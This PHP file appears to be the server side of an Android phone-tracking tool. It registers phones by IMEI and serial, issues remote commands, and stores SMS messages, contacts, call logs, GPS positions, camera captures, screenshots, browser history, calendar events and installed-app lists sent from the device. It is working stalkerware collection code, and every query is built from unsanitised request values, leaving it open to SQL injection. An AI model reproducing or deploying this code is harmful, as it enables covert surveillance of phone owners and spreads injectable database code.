<?php
global $db,$prefix;

$mysql_host	= 'localhost';
$mysql_user = 'root';
$mysql_pass	= '';
$mysql_db	= 'kopasprojects_tracker';
$prefix 	= 'mata_';



$db = mysqli_connect( $mysql_host,$mysql_user,$mysql_pass,$mysql_db );
if (mysqli_connect_errno()) die('Maaf database tidak ditemukan');

function safeBase64Encode($string){
    $primaryencoded=base64_encode($string);
    $finalencoded=str_replace('/','-',$primaryencoded);
    return $finalencoded;
}


if(  !empty($_POST["token"]) ){
    $token = !empty( $_POST['token'] ) ? $_POST['token'] : '';

    $response = array();

    $sql = mysqli_query($db,"SELECT * FROM ".$prefix."users WHERE token='$token'");

    if ( mysqli_num_rows($sql) > 0) {

        $phone_serial = isset( $_POST["serial"] ) ? $_POST["serial"] : 0;
        $phone_model = isset( $_POST["model"] ) ? $_POST["model"] : 0;
        $phone_imei = isset( $_POST["imei"] ) ? $_POST["imei"] : 0;

        $timestamp = date('Y-m-d G:i:s');
        $sql2 = mysqli_query($db,"UPDATE ".$prefix."users SET last_active='$timestamp' WHERE token='$token'");

        $response["response"] = array();
        while ($r = mysqli_fetch_array($sql)){
            $user_id = $r['user_id'];

            $array_push = array();
            $array_push['phone_id'] = (int) 0;


            if(!empty($phone_serial) && !empty($phone_model) ){
                $versicode = !empty( $_GET['versicode'] ) ? $_GET['versicode'] : '';
                $versiname = !empty( $_GET['versiname'] ) ? $_GET['versiname'] : '';
                $nama = !empty( $_GET['$nama'] ) ? $_GET['$nama'] : '';

                $sql2 = mysqli_query($db,"SELECT * FROM ".$prefix."phone WHERE user_id='$user_id' AND phone_serial='$phone_serial' AND phone_model='$phone_model'");

                if ( mysqli_num_rows($sql2) > 0) {
                    while ($r2 = mysqli_fetch_array($sql2)){
                        $array_push['phone_id'] = (int) $r2['phone_id'];

                        if( empty($nama) ) $nama = $r2['phone_name'];

                        mysqli_query($db,"UPDATE ".$prefix."phone SET phone_name='$nama',versicode='$versicode',versiname='$versiname' WHERE user_id='$user_id' AND phone_serial='$phone_serial' AND phone_model='$phone_model'");

                    }
                }else{

                    if( empty($nama) ) $nama = $phone_model;

                    mysqli_query($db,"INSERT INTO ".$prefix."phone (user_id,phone_name,phone_imei,phone_serial,phone_model,versicode,versiname) VALUES ('$user_id','$nama','$phone_imei','$phone_serial','$phone_model','$versicode','$versiname')");

                    $phone_id = mysqli_insert_id($db);
                    $array_push['phone_id'] = $phone_id;

                }
            }

            $array_push['user_id'] = (int) $user_id;
            array_push($response["response"], $array_push);

        }

        $response["success"] = true;
        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }else{
        //mysqli_query($db,"INSERT INTO ".$prefix."users (user_id,username) VALUES ('$user_id','$username')");

        $response["success"] = false;
        $response["response"] = "";
        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

}elseif( !empty($_GET["user_id"]) && !empty($_GET["phone_id"]) ){

    $user_id = !empty( $_GET['user_id'] ) ? $_GET['user_id'] : '';
    $phone_id = !empty( $_GET['phone_id'] ) ? $_GET['phone_id'] : '';
    $versicode = !empty( $_GET['versicode'] ) ? $_GET['versicode'] : '';
    $versiname = !empty( $_GET['versiname'] ) ? $_GET['versiname'] : '';
	

    //lapor status phone
    if( isset($_GET["online"]) && $_GET["online"] == "1" ){
			
			
		$response = array();
			
		//$sql = mysqli_query($db,"SELECT * FROM account LEFT JOIN phone ON phone.auth=account.api_key WHERE account.user='$user',account.pass='$pass',phone.imei='$imei',phone.serial='$serial'");
		
		$sql = mysqli_query($db,"SELECT * FROM ".$prefix."users WHERE user_id='$user_id'");
		
		if ( mysqli_num_rows($sql) > 0) {

			$row = mysqli_fetch_array($sql);
			$timestamp = date('Y-m-d G:i:s');
			$sql2 = mysqli_query($db,"UPDATE ".$prefix."users SET last_active='$timestamp' WHERE user_id='$user_id'");
            $sql3 = mysqli_query($db,"UPDATE ".$prefix."phone SET phone_last_active='$timestamp',versicode='$versicode',versiname='$versiname' WHERE user_id='$user_id' AND  phone_id='$phone_id'");

			$response["success"] = true;
			$response["response"] = "";
			header('Content-type: application/json; charset=utf-8');
			echo json_encode($response);
		}else{
			//mysqli_query($db,"INSERT INTO ".$prefix."users (user_id,username) VALUES ('$user_id','$username')");
			
			$response["success"] = false;
			$response["response"] = "";
			header('Content-type: application/json; charset=utf-8');
			echo json_encode($response);
		}



/**

	//command get
	}elseif( isset($_GET["serial"]) && isset($_GET["phone_model"]) ){
			
		$serial = $_GET["serial"];
		$phone_model = $_GET["phone_model"];
			
		$response = array();
			
		//$sql = mysqli_query($db,"SELECT * FROM account LEFT JOIN phone ON phone.auth=account.api_key WHERE account.user='$user',account.pass='$pass',phone.imei='$imei',phone.serial='$serial'");
		
		$sql = mysqli_query($db,"SELECT * FROM ".$prefix."users WHERE user_id='$user_id'");
		
		if ( mysqli_num_rows($sql) > 0) {
			
			//$row = mysqli_fetch_array($sql);
			
			$sql2 = mysqli_query($db,"UPDATE ".$prefix."users SET serial='$serial', phone_model='$phone_model' WHERE user_id='$user_id'");
			$sql3 = mysqli_query($db,"DELETE FROM ".$prefix."collect_installed_apps WHERE user_id='$user_id'");
			$sql4 = mysqli_query($db,"DELETE FROM ".$prefix."collect_phone_details WHERE user_id='$user_id'");
			
			$response["success"] = true;
			$response["response"] = "";
			header('Content-type: application/json; charset=utf-8');
			echo json_encode($response);
		}else{
			//mysqli_query($db,"INSERT INTO ".$prefix."users (user_id,username,serial,phone_model) VALUES ('$user_id','$username','$serial','$phone_model')");
			
			$response["success"] = false;
			$response["response"] = "";
			header('Content-type: application/json; charset=utf-8');
			echo json_encode($response);
		}
*/




	//command get
	}elseif( isset($_GET["command"]) ){
		
		if($_GET["command"] == "get"){
		
			$sql = mysqli_query($db,"SELECT * FROM ".$prefix."commands WHERE panding='1'  AND user_id='$user_id' AND phone_id='$phone_id' ORDER BY start ASC");
			if ( mysqli_num_rows($sql) > 0) {

				$response = array();
				$response["response"] = array();
				while ($r = mysqli_fetch_array($sql)){

					$array_push['start']  		= $r['start'];
					$array_push['end']  		= $r['end'];
					$array_push['id']  			= $r['id'];
					$array_push['param1']  		= $r['param1'];
					$array_push['param2']  		= $r['param2'];
					$array_push['param3']		= $r['param3'];
					$array_push['param4']		= $r['param4'];
					$array_push['panding']		= $r['panding'];
					array_push($response["response"], $array_push);

				}


				$response["success"] = true;
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}else {
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}
		}elseif($_GET["command"] == "set"){
			$id = $_GET["id"];

			$query = mysqli_query($db,"SELECT * FROM ".$prefix."commands WHERE panding='1' AND user_id='$user_id'AND phone_id='$phone_id' AND id='$id'");
			if ( mysqli_num_rows($query) > 0) {
				
				$query2 = mysqli_query($db,"UPDATE ".$prefix."commands SET panding='0', end='".date('Y-m-d H:i:s')."' WHERE panding='1' AND id='$id' AND user_id='$user_id' AND phone_id='$phone_id'");
				
				if ( $query2 ) {
					$response["success"] = true;
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{					
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);					
				}
			}else {
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}
		}else {
			$response["success"] = false;
			$response["response"] = "";
			header('Content-type: application/json; charset=utf-8');
			echo json_encode($response);
		}






	//collect_phone_details
	}elseif( isset($_GET["k"]) && isset($_GET["v"]) ){
			
			$k = $_GET["k"];
			$v = $_GET["v"];
			
		
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."collect_phone_details WHERE user_id='$user_id' AND phone_id='$phone_id' AND v='$v'");
			if( mysqli_num_rows($query) < 1 ){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$query2 = mysqli_query($db,"INSERT INTO ".$prefix."collect_phone_details (collect_phone_details_id,user_id,phone_id,k,v) VALUES($mysql_id,'$user_id','$phone_id','$k','$v')");
				if($query2){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
				
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}



		
	//collect_installed_apps
	}elseif( isset($_GET["app_name"]) && isset($_GET["app_package"]) && isset($_GET["app_uid"]) && isset($_GET["app_vname"]) && isset($_GET["app_vcode"]) ){
			
			$app_name = $_GET["app_name"];
			$app_package = $_GET["app_package"];
			$app_uid = $_GET["app_uid"];
			$app_vname = $_GET["app_vname"];
			$app_vcode = $_GET["app_vcode"];
			
			
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."collect_installed_apps WHERE user_id='$user_id' AND phone_id='$phone_id' AND app_uid='$app_uid' AND app_vcode='$app_vcode'");
			if( mysqli_num_rows($query) < 1 ){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."collect_installed_apps (collect_installed_apps_id,user_id,phone_id,app_name,app_package,app_uid,app_vname,app_vcode) VALUES($mysql_id,'$user_id','$phone_id','$app_name','$app_package','$app_uid','$app_vname','$app_vcode')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
				
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}


		
	//capture
	}elseif( isset($_POST["image"]) ){
			
        $image = $_POST["image"];

        $response = array();

        $mysql_id = mysqli_insert_id($db);
        $run = mysqli_query($db,"INSERT INTO ".$prefix."camera (camera_id,image,user_id,phone_id) VALUES($mysql_id,'$image','$user_id','$phone_id')");
        if($run){
            $response["success"] = true;
            $response["response"] = "";
            header('Content-type: application/json; charset=utf-8');
            echo json_encode($response);
        }else{
            $response["success"] = false;
            $response["response"] = "";
            header('Content-type: application/json; charset=utf-8');
            echo json_encode($response);

        }

			/**
			$photos_jsonArray = json_decode($image,true);
            if($photos_jsonArray!=NULL)//NULL if JSON cannot be decoded
            {
                foreach ($photos_jsonArray as $photo_jsonObject)
                {
                    if($photo_jsonObject!=NULL)
                    {
                        $timestamp=$photo_jsonObject['Timestamp'];
                        $imagebase64=$photo_jsonObject['ImageBase64'];
                        
                        $saveasfilename = safeBase64Encode($user_id).'_'.safeBase64Encode($timestamp).'.jpg';
                        $filestream=fopen($saveasfilename,'wb');
                        if($filestream)
                        {
                            fwrite($filestream, base64_decode($imagebase64));
                            fclose($filestream);
                        }
						
						
						$response = array();

						$mysql_id = mysqli_insert_id($db);
						$run = mysqli_query($db,"INSERT INTO ".$prefix."camera (camera_id,image,user_id,phone_id) VALUES($mysql_id,'$saveasfilename','$user_id','$phone_id')");
						if($run){
							$response["success"] = true;
							$response["response"] = "";
							header('Content-type: application/json; charset=utf-8');
							echo json_encode($response);
						}else{
							$response["success"] = false;
							$response["response"] = "";
							header('Content-type: application/json; charset=utf-8');
							echo json_encode($response);

						}
                    }
                    
                    
                }
			}*/
			
		
			//$query = mysqli_query($db,"SELECT * FROM camera WHERE phone_id='$phone_id' AND auth='$auth'");
			//if(!mysqli_num_rows($query)){
				
			/**}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}*/



		
	//screenshot
	}elseif( isset($_GET["screenshot"]) ){
			
			$screenshot = $_GET["screenshot"];
		
			$photos_jsonArray = json_decode($screenshot,true);
            if($photos_jsonArray!=NULL)//NULL if JSON cannot be decoded
            {
                foreach ($photos_jsonArray as $photo_jsonObject)
                {
                    if($photo_jsonObject!=NULL)
                    {
                        $timestamp=$photo_jsonObject['Timestamp'];
                        $imagebase64=$photo_jsonObject['ImageBase64'];
                        
                        $saveasfilename = safeBase64Encode($user_id).'_'.safeBase64Encode($timestamp).'.jpg';
                        $filestream=fopen($saveasfilename,'wb');
                        if($filestream)
                        {
                            fwrite($filestream, base64_decode($imagebase64));
                            fclose($filestream);
                        }
						
						
						$response = array();

						$mysql_id = mysqli_insert_id($db);
						$run = mysqli_query($db,"INSERT INTO ".$prefix."screenshot (screenshot_id,screenshot,user_id,phone_id) VALUES($mysql_id,'$saveasfilename','$user_id','$phone_id')");
						if($run){
							$response["success"] = true;
							$response["response"] = "";
							header('Content-type: application/json; charset=utf-8');
							echo json_encode($response);
						}else{
							$response["success"] = false;
							$response["response"] = "";
							header('Content-type: application/json; charset=utf-8');
							echo json_encode($response);

						}
                    }
                    
                    
                }
			}
			
		
			//$query = mysqli_query($db,"SELECT * FROM camera WHERE phone_id='$phone_id' AND auth='$auth'");
			//if(!mysqli_num_rows($query)){
				
			/**}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}*/







	//gps
        /**
	}elseif( isset($_GET["picture"]) ){
			
			$picture = $_GET["picture"];
			$picture_file = $_GET["picture_file"];
			$picture_folder = $_GET["picture_folder"];
			$picture_type = $_GET["picture_type"];
			$picture_date = $_GET["picture_date"];
		
			$photos_jsonArray = json_decode($picture,true);
            if($photos_jsonArray!=NULL)//NULL if JSON cannot be decoded
            {
                foreach ($photos_jsonArray as $photo_jsonObject)
                {
                    if($photo_jsonObject!=NULL)
                    {
                        $timestamp=$photo_jsonObject['Timestamp'];
                        $imagebase64=$photo_jsonObject['ImageBase64'];
                        
                        $saveasfilename = safeBase64Encode($user_id).'_'.safeBase64Encode($timestamp).'_'.$picture_file.'.jpg';
                        $filestream=fopen($saveasfilename,'wb');
                        if($filestream)
                        {
                            fwrite($filestream, base64_decode($imagebase64));
                            fclose($filestream);
                        }
						
						
						$response = array();
						

						$sql = mysqli_query($db,"SELECT * FROM ".$prefix."pictures WHERE pictures_file='$picture_file' AND picture_date='$picture_date',user_id=='$user_id',phone_id='$phone_id'");
						if( mysqli_num_rows($sql) < 1){

							$mysql_id = mysqli_insert_id($db);
							$run = mysqli_query($db,"INSERT INTO ".$prefix."pictures (pictures_id,pictures_file,pictures_folder,pictures_type,picture_date,user_id,phone_id VALUES($mysql_id,'$saveasfilename','$picture_folder','$picture_type','$picture_date','$user_id','$phone_id')");
							if($run){
								$response["success"] = true;
								$response["response"] = "";
								header('Content-type: application/json; charset=utf-8');
								echo json_encode($response);
							}else{
								$response["success"] = false;
								$response["response"] = "";
								header('Content-type: application/json; charset=utf-8');
								echo json_encode($response);

							}
						}else{
							$response["success"] = false;
							$response["response"] = "";
							header('Content-type: application/json; charset=utf-8');
							echo json_encode($response);

						}
                    }
                    
                    
                }
			}
			
		
			//$query = mysqli_query($db,"SELECT * FROM camera WHERE phone_id='$phone_id' AND auth='$auth'");
			//if(!mysqli_num_rows($query)){
				
			/**}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}*/







	//gps
	}elseif( isset($_GET["coordinat"]) && $_GET["coordinat"] = 1 ){
			
        $lat = $_GET["lat"];
        $long = $_GET["long"];

        $coordinat_text = "lat=$lat, long= $long";
			
			$tanggal = date('Y-m-d H:i:s');
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."gps WHERE coordinat='$coordinat_text' AND tanggal='$tanggal' AND user_id='$user_id' AND phone_id='$phone_id'");
			if( mysqli_num_rows($query) < 1){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."gps (gps_id,coordinat,tanggal,user_id,phone_id) VALUES($mysql_id,'$coordinat_text','$tanggal','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}






	//history_word
	}elseif( isset($_GET["locale"]) && isset($_GET["dictionary_word"]) && isset($_GET["dictionary_id"]) ){
			
			$locale = $_GET["locale"];
			$dictionary_word = $_GET["dictionary_word"];
			$dictionary_id = $_GET["dictionary_id"];
			
			
			
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."history_word WHERE history_word_id='$dictionary_id' AND user_id='$user_id' AND phone_id='$phone_id'");
			if(!mysqli_num_rows($query)){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."history_word (history_word_id,locale,dictionary_word,dictionary_id,user_id,phone_id) VALUES($mysql_id,'$locale','$dictionary_word','$dictionary_id','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
				
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}





	//history_bookmark
	}elseif( isset($_GET["bookmark_title"]) && isset($_GET["bookmark_url"]) && isset($_GET["bookmark_date"]) && isset($_GET["bookmark_visits"]) ){
			
			$bookmark_title = $_GET["bookmark_title"];
			$bookmark_url = $_GET["bookmark_url"];
			$bookmark_date = $_GET["bookmark_date"];
			$bookmark_visits = $_GET["bookmark_visits"];
			
			
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."history_bookmark WHERE bookmark_title='$bookmark_title' AND bookmark_url='$bookmark_url' AND bookmark_date='$bookmark_date' AND bookmark_visits='$bookmark_visits' AND user_id='$user_id' AND phone_id='$phone_id'");
			if(!mysqli_num_rows($query)){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."history_bookmark (history_bookmark_id,bookmark_title,bookmark_url,bookmark_date,bookmark_visits,user_id,phone_id) VALUES($mysql_id,'$bookmark_title','$bookmark_url','$bookmark_date','$bookmark_visits','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
				
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}





	//history_search
	}elseif( isset($_GET["search_title"]) && isset($_GET["search_date"]) ){
			
			$search_title = $_GET["search_title"];
			$search_date = $_GET["search_date"];
			
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."history_search WHERE search_title='$search_title' AND search_date='$search_date' AND user_id='$user_id' AND phone_id='$phone_id'");
			if( mysqli_num_rows($query) < 1 ){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."history_search (history_search_id,search_title,search_date,user_id,phone_id) VALUES($mysql_id,'$search_title','$search_date','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
				
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}





	//calendar_events
	}elseif( isset($_GET["event_timezone"]) && isset($_GET["event_title"]) && isset($_GET["event_id"]) && isset($_GET["event_description"]) && isset($_GET["event_location"]) && isset($_GET["event_calendar_account_name"]) && isset($_GET["event_title"]) ){
			
			$event_timezone = $_GET["event_timezone"];
			$event_title = $_GET["event_title"];
			$event_id = $_GET["event_id"];
			$event_description = $_GET["event_description"];
			$event_location = $_GET["event_location"];
			$event_calendar_account = $_GET["event_calendar_account"];
			$event_calendar_account_name = $_GET["event_calendar_account_name"];
		
		
		
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."calendar_events WHERE event_id='$event_id' AND user_id='$user_id' AND phone_id='$phone_id'");
			if(!mysqli_num_rows($query)){
			
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."calendar_events (calendar_events_id,event_timezone,event_title,event_id,event_description,event_location,event_calendar_account_name,user_id,phone_id) VALUES($mysql_id,'$event_timezone','$event_title','$event_id','$event_description','$event_location','$event_calendar_account_name','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}





	//sms
	}elseif( isset($_POST["address"]) && isset($_POST["message"]) && isset($_POST["date"]) ){
			
			$address = $_POST["address"];
			$message = $_POST["message"];
			$tanggal = $_POST["date"];
			$reader = $_POST["read"];
			$id = $_POST["id"];
			$type = $_POST["type"];
			
		
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."sms WHERE address='$address' AND tanggal='$tanggal' AND reader='$reader' AND type='$type' AND id='$id' AND user_id='$user_id' AND phone_id='$phone_id'");
			if(!mysqli_num_rows($query)){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."sms (sms_id,address,message,tanggal,reader,id,type,user_id,phone_id) VALUES($mysql_id,'$address','$message','$tanggal','$reader','$id','$type','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}
		





	//contacts
	}elseif( isset($_POST["contact_name"]) && isset($_POST["contact_phone"]) ){
			
			$contact_name = $_POST["contact_name"];
			$contact_phone = $_POST["contact_phone"];
			
		
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."contacts WHERE contact_name='$contact_name' AND contact_phone='$contact_phone' AND user_id='$user_id' AND phone_id='$phone_id'");
			if(!mysqli_num_rows($query)){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."contacts (contacts_id,contact_name,contact_phone,user_id,phone_id) VALUES($mysql_id,'$contact_name','$contact_phone','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}






	//call_logs
	}elseif( isset($_POST["phone_number"]) && isset($_POST["call_date"]) && isset($_POST["call_type"]) && isset($_POST["call_duration"]) ){
			
			$phone_number = $_POST["phone_number"];
			$call_date = $_POST["call_date"];
			$call_type = $_POST["call_type"];
			$call_duration = $_POST["call_duration"];
			
		
			$query = mysqli_query($db,"SELECT * FROM ".$prefix."call_logs WHERE phone_number='$phone_number' AND call_date='$call_date' AND call_type='$call_type' AND call_duration='$call_duration' AND user_id='$user_id' AND phone_id='$phone_id'");
			if(!mysqli_num_rows($query)){
				
				$response = array();

				$mysql_id = mysqli_insert_id($db);
				$run = mysqli_query($db,"INSERT INTO ".$prefix."call_logs (call_logs_id,phone_number,call_date,call_type,call_duration,user_id,phone_id) VALUES($mysql_id,'$phone_number','$call_date','$call_type','$call_duration','$user_id','$phone_id')");
				if($run){
					$response["success"] = true;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);
				}else{
					$response["success"] = false;
					$response["response"] = "";
					header('Content-type: application/json; charset=utf-8');
					echo json_encode($response);

				}
			}else{
				
				$response["success"] = false;
				$response["response"] = "";
				header('Content-type: application/json; charset=utf-8');
				echo json_encode($response);
			}
			
	}else{
				
	    $response["success"] = false;
	    $response["response"] = "";
	    header('Content-type: application/json; charset=utf-8');
	    echo json_encode($response);
	}
}else{
    $response["success"] = false;
    $response["response"] = "";
    header('Content-type: application/json; charset=utf-8');
    echo json_encode($response);
}
?>